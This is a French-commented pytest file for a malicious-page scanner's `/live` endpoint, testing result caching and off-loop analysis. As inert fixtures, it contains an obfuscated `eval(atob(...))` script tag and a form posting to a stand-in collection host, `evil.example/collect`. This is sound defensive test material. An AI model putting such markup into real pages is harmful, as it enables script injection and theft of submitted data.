# SPDX-FileCopyrightText: 2026 GuatX
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Coût CPU de `/live` — saturation depuis le contenu ANALYSÉ.

`/live` est pollé toutes les 2 s par session (web/ui/views/interactive.js) et
refaisait TOUT le travail d'analyse à chaque appel, même DOM inchangé : le
balayage statique passe 64 motifs sur le document entier. Le calcul était fait
DANS la coroutine, donc sur la boucle d'évènements qui pilote Camoufox et sert
`/health` : tant qu'il dure, la boucle ne rend pas la main, la sonde de
disponibilité du web expire et une session pourtant SAINE est détruite.

Aucun chiffre de coût n'est cité ici, et c'est délibéré : le « ~590 ms/Mio »
d'origine était mesuré sur un échantillon BÉNIN et sous-estimait de deux ordres
de grandeur la facture d'un contenu hostile (mesuré sur 2067ee7 : 27 295 ms pour
128 Kio de `eval(` répété). Ce fichier vérifie OÙ tourne le calcul et COMBIEN DE
FOIS il est fait — deux propriétés déterministes, indépendantes de la machine.
Le coût, lui, est mesuré là où il est borné : tests/test_static_bounded.py.

Deux garanties verrouillées ici :
  1. deux polls consécutifs à DOM identique ne déclenchent qu'UNE analyse ;
  2. l'analyse ne tourne PAS sur le thread de la boucle d'évènements — donc
     `/health`, `/goto` et `/capture` restent servis pendant qu'elle tourne.
"""
import asyncio
import threading

import pytest
from fastapi.testclient import TestClient

import runner_recon_vnc.session_server as ss

_SECRET = "the-live-secret"


class _FakePage:
    def __init__(self, dom: str) -> None:
        self._dom = dom

    def set_dom(self, dom: str) -> None:
        self._dom = dom

    async def content(self) -> str:
        return self._dom


class _FakeCap:
    network: list = []
    console: list = []


@pytest.fixture
def live_client(monkeypatch):
    monkeypatch.setenv("OCULAR_SESSION_SECRET", _SECRET)
    ss._state.update(cm=None, page=None, cap=None, target=None, kind=None, html_input="")
    ss._LIVE_ANALYSIS.clear()
    return TestClient(ss.app)


def _get_live(client):
    return client.get("/live", headers={"X-Session-Secret": _SECRET})


def test_live_analyzes_once_for_two_polls_of_the_same_dom(live_client, monkeypatch):
    # `eval(atob(...))` ci-dessous est une chaîne d'octets INERTE (faux DOM
    # capturé), jamais exécutée : elle ne sert qu'à faire mordre un motif
    # d'engine.static — même convention que tests/test_session_server_logic.py.
    dom = '<html><body><script>eval(atob("x"))</script></body></html>'
    calls = {"analyze": 0, "forms": 0, "mailtos": 0}

    def _counting(name, fn):
        def _wrapped(html):
            calls[name] += 1
            return fn(html)
        return _wrapped

    monkeypatch.setattr(ss, "scan_html", _counting("analyze", ss.scan_html))
    monkeypatch.setattr(ss, "extract_forms", _counting("forms", ss.extract_forms))
    monkeypatch.setattr(ss, "extract_mailtos", _counting("mailtos", ss.extract_mailtos))

    ss._state.update(page=_FakePage(dom), cap=_FakeCap())

    first = _get_live(live_client).json()
    second = _get_live(live_client).json()

    # Le poll de l'UI est de 2 s : sans mémoïsation, chaque tour refait tout.
    assert calls == {"analyze": 1, "forms": 1, "mailtos": 1}, (
        f"analyse recalculée alors que le DOM n'a pas bougé : {calls}"
    )
    # ... et le second poll rend EXACTEMENT le même contenu (pas un cache vide).
    assert second["findings"] == first["findings"] != []
    assert second["verdict"] == first["verdict"] == "malicious"
    assert second["counts"] == first["counts"]


def test_live_reanalyzes_when_the_dom_changes(live_client, monkeypatch):
    calls = {"n": 0}
    real_analyze = ss.scan_html

    def _counting(html):
        calls["n"] += 1
        return real_analyze(html)

    monkeypatch.setattr(ss, "scan_html", _counting)

    page = _FakePage("<html><body>rien</body></html>")
    ss._state.update(page=page, cap=_FakeCap())

    first = _get_live(live_client).json()
    assert first["findings"] == [] and first["forms"] == []

    page.set_dom('<form action="https://evil.example/collect" method="POST"></form>')
    second = _get_live(live_client).json()

    assert calls["n"] == 2, "un DOM différent DOIT être ré-analysé (cache trop agressif)"
    assert second["forms"] == [{"action": "https://evil.example/collect", "method": "POST"}]


def test_live_analysis_runs_off_the_event_loop_thread():
    """L'analyse d'un DOM de plusieurs Mio dure des SECONDES : tant qu'elle
    s'exécute sur le thread de la boucle, `/health` n'est pas servi et le web
    détruit la session. On vérifie donc où elle tourne, pas combien de temps
    elle dure (mesure déterministe, sans dépendance à la charge machine)."""
    seen: dict[str, int | None] = {"analyze_thread": None, "loop_thread": None}
    original = ss.scan_html

    def _spy(html):
        seen["analyze_thread"] = threading.get_ident()
        return original(html)

    async def _scenario():
        seen["loop_thread"] = threading.get_ident()
        ss._LIVE_ANALYSIS.clear()
        ss._state.update(page=_FakePage("<html><body>lourd</body></html>"), cap=_FakeCap())
        ss.scan_html = _spy
        try:
            await ss.live()
        finally:
            ss.scan_html = original

    asyncio.run(_scenario())

    assert seen["analyze_thread"] is not None, "scan_html n'a pas été appelée"
    assert seen["analyze_thread"] != seen["loop_thread"], (
        "scan_html tourne sur la boucle d'évènements : elle gèle /health, "
        "/goto et /capture pendant tout le balayage du DOM"
    )
